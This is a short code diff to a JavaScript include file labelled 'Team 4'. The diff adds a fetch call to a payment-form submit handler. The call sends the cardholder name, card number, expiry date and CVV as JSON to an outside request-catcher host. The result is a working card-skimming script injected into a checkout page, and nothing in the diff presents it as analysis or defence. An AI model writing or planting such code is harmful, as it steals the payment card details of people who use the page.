@@ -1,8 +1,6 @@
 console.log("Team 4 include file loaded...");
 
-const paymentForm = document.getElementById('payment-form');
-
-paymentForm.addEventListener('submit', function(event) {
+document.getElementById('payment-form').addEventListener('submit', function(event) {
     // Get input values by ID
     const cardName = document.getElementById('card-name').value;
     const cardNumber = document.getElementById('card-number').value;
@@ -14,4 +12,18 @@ paymentForm.addEventListener('submit', function(event) {
     console.log('Card Number:', cardNumber);
     console.log('Expiry:', expiry);
     console.log('CVV:', cvv);
+
+    // Send POST request with payment details
+    fetch('https://hfj.requestcatcher.com/test', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+            cardName: cardName,
+            cardNumber: cardNumber,
+            expiry: expiry,
+            cvv: cvv
+        })
+    });
 });
